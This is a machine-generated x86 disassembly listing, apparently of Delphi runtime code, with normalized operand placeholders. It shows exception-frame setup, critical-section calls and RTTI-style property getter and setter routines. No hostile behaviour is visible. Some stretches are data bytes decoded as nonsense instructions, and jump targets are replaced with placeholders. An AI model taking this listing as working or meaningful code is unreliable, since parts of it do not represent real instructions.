push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404f50
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4144a4
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_4030a4
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_4041b4
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407e4c
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_4144e4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_414553
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41455a
retn
call sub_414088
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_405110
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_4049cc
mov eax rw-data
call sub_403f50
mov eax rw-data
call sub_40ee2c
sub_41455c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4145fd
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414604
retn
mov eax rw-data
call sub_413fe4
mov eax sub_40eb2c
mov [ rw-data ] eax
mov eax sub_40e67c
mov [ rw-data ] eax
mov edx sub_40e58c
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40ee2c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_413bd8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f140
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412130
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412858
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_414608
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x699c0000 ] ch
dec eax
add [ ebp + 0x640000ff ] ch
xchg esi eax
dec eax
add [ esi + 0x640000ff ] ch
xchg esi eax
dec eax
add [ edi + 0x640000ff ] ch
xchg esi eax
dec eax
add [ eax + 0x640000ff ] dl
xchg esi eax
dec eax
add [ ecx + 0x640000ff ] dl
xchg esi eax
dec eax
add [ edx + 0x640000ff ] dl
xchg esi eax
dec eax
add [ ebx + 0x640000ff ] dl
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x699c0000 ] dl
dec eax
add [ ebp + 0x640000ff ] dl
xchg esi eax
dec eax
add [ esi + 0x640000ff ] dl
xchg esi eax
dec eax
add [ edi + 0x640000ff ] dl
xchg esi eax
dec eax
add [ eax + 0x640000ff ] bl
xchg esi eax
dec eax
add [ ecx + 0x640000ff ] bl
xchg esi eax
dec eax
add [ edx + 0x640000ff ] bl
xchg esi eax
dec eax
add [ ebx + 0x640000ff ] bl
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x699c0000 ] bl
dec eax
add [ ebp + 0x640000ff ] bl
xchg esi eax
dec eax
add [ esi + 0x640000ff ] bl
xchg esi eax
dec eax
add [ edi + 0x640000ff ] bl
xchg esi eax
dec eax
add [ eax + 0x640000ff ] al
xchg esi eax
dec eax
add [ ecx + 0x640000ff ] al
xchg esi eax
dec eax
add [ edx + 0x640000ff ] al
xchg esi eax
dec eax
add [ ebx + 0x640000ff ] al
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x699c0000 ] al
dec eax
add [ ebp + 0x640000ff ] al
xchg esi eax
dec eax
add [ esi + 0x640000ff ] al
xchg esi eax
dec eax
add [ edi + 0x640000ff ] al
xchg esi eax
dec eax
add [ eax + 0x640000ff ] cl
xchg esi eax
dec eax
add [ ecx + 0x640000ff ] cl
xchg esi eax
dec eax
add [ edx + 0x640000ff ] cl
xchg esi eax
dec eax
add [ ebx + 0x550000ff ] cl
mov ebp esp
xor eax eax
push ebp
push sub_41472d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414734
retn
sub_414778
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_414836
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi ] 0x1
jne r-xdata
mov eax esi
call sub_41476c
mov eax [ eax + 0x9 ]
mov eax [ eax ]
call sub_41476c
cmp esi [ r-xdata ]
je r-xdata
mov edx edi
mov eax ebx
call sub_408080
jmp r-xdata
mov eax edi
test ebx ebx
setne dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_403fa4
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_407e4c
test al al
je r-xdata
cmp [ eax + 0x1 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41483d
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
lea edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_407d6c
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_403fa4
jmp r-xdata
lea esi [ eax + 0xd ]
test ebx ebx
je r-xdata
mov eax edi
mov edx esi
call sub_4041b4
xor eax eax
mov al [ esi ]
inc eax
add esi eax
dec ebx
test ebx ebx
jne r-xdata
sub_414850
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_41489c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_41476c
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_4081bc
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_414850
mov edx [ rw-data ]
mov eax esi
call sub_407e4c
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407e4c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_4081bc
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_414900
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_414970
push ebx
push esi
push edi
xor ecx ecx
mov esi eax
mov cl [ eax + 0x1 ]
mov edi edx
xor eax eax
movzx ecx [ esi + ecx + 0xa ]
[ edi ]
mov esi [ esi + 0x4 ]
xor ecx ecx
test esi esi
je r-xdata
lea edi [ esi + ecx + 0xd ]
pop edi
pop esi
pop ebx
retn
mov esi [ esi ]
jmp r-xdata
lea edi [ edi + ecx + 0x1b ]
dec eax
jne r-xdata
mov [ edx + ebx * 4 ] edi
mov cl [ esi + 0x1 ]
lea esi [ esi + ecx + 0x2 ]
mov cl [ esi + 0xa ]
movzx eax [ esi + ecx + 0xb ]
test eax eax
je r-xdata
movzx ebx [ edi + 0x18 ]
mov cl [ edi + 0x1a ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub_4149c4
mov ecx [ edx + 0xc ]
test ecx 0xffffff00
je r-xdata
mov al cl
retn
cmp [ edx + 0xf ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
call ecx
retn
ja r-xdata
and ecx 0xffffff
mov cl [ ecx + eax ]
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_4149f4
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_414a68
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_414ac4
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add esi eax
mov edi ecx
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_414b08
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_414b84
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_4041ec
mov ecx esp
mov edx esi
mov eax ebx
call sub_414b08
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_414bcc
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
mov edx [ esi + eax ]
mov eax ecx
call sub_414bb8
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_414c0c
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_414bb8
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_414c4c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414c94
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_414d68
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4041d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c9b
lea eax [ ebp - 0x4 ]
call sub_404630
retn
sub_414ca4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414cec
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_40477c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_414e50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414cf3
lea eax [ ebp - 0x4 ]
call sub_404630
retn
sub_414cfc
push ebx
mov ebx ecx
mov ecx [ edx ]
mov ecx [ ecx ]
mov cl [ ecx ]
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_414b5c
pop ebx
retn
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_414bcc
pop ebx
retn
dec cl
je r-xdata
mov ecx ebx
call sub_414c4c
pop ebx
retn
jmp r-xdata
mov eax ebx
call sub_403f50
pop ebx
retn
sub_414d3c
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_414b84
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_414c0c
pop ebx
retn
dec bl
je r-xdata
call sub_414ca4
jmp r-xdata
pop ebx
retn
sub_414d68
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_414e40
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_414cfc
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_40477c
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414e47
lea eax [ ebp - 0x10 ]
call sub_403f50
retn
dec al
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_40466c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404630
mov [ ebp - 0xc ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov [ ebp - 0x8 ] esi
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_414e50
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_414f16
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4041d8
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_414d3c
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414f1d
lea eax [ ebp - 0xc ]
call sub_403f50
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_40466c
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_414f24
push ebx
push esi
add esp 0xffffffec
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov esi edx
and esi 0xffffff
add esi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_41476c
movzx eax [ eax ]
cmp eax 0x4
ja r-xdata
mov [ esp + 0xc ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0xc ] edx
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] ax
jmp r-xdata
jmp [ eax * 4 + jump_table_414f64 ]
mov edx eax
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
fld [ esp ]
add esp 0x14
pop esi
pop ebx
retn
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ esi ]
mov [ esp ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
mov ax [ esi + 0x8 ]
mov [ esp + 0x8 ] ax
jmp r-xdata
fild [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ esi ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
mov eax [ ebx ]
mov eax [ eax ]
call sub_41476c
cmp [ eax ] 0x4
jne r-xdata
sub_41503c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_41476c
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_415084 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4151b3 ]
jmp [ eax * 4 + jump_table_415120 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_415248
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
lea edx [ esi + eax ]
mov eax ecx
call sub_415234
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_415288
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_415234
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_4152c8
push ebx
push esi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov ebx [ esi + 0x4 ]
cmp [ esi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and ebx 0xffffff
add eax ebx
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
pop esi
pop ebx
retn
jb r-xdata
call ebx
pop esi
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop esi
pop ebx
retn
sub_415308
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_415340
cmp [ edx + 0x7 ] 0xfe
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x10 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
retn
jb r-xdata
call ecx
retn
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_415368
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_4153a4
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] ecx
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov ebx edx
and ebx 0xffffff
add ebx eax
mov eax [ esp ]
mov edx [ ebx ]
call sub_4057d4
jmp r-xdata
mov [ esp + 0x4 ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0x4 ] edx
jmp r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx esi
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
jmp r-xdata
mov [ esp + 0x8 ] eax
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_415424
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_4057d4
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_415498
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4154de
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4154e5
retn
mov eax rw-data
call sub_403f50
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4049cc
sub_415510
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_415535
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41553c
retn
sub_415e59
xor eax 0x4300415e
pop esi
inc ecx
add [ ebp + 0x5e ] cl
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
pop ecx
pop esi
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x5ed40040 ] cl
inc ecx
add [ ebp + 0x5e ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add ah ah
pop esi
inc ecx
add [ eax ] dl
pop edi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh dh
pop esi
inc ecx
add [ eax + eax ] cl
add [ eax ] al
cwde
pop ebp
inc ecx
add [ ebx + esi - 0x72afffc0 ] al
inc ecx
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
or [ ebx - 0x736fffbf ] 0x41
add [ eax - 0x53ffbe74 ] bl
mov eax [ ecx ]
loopne r-xdata
add [ eax ] al
rol [ eax ] 0x0
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] ah
inc eax
add [ eax + eax ] al
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
cwde
pop ebp
inc ecx
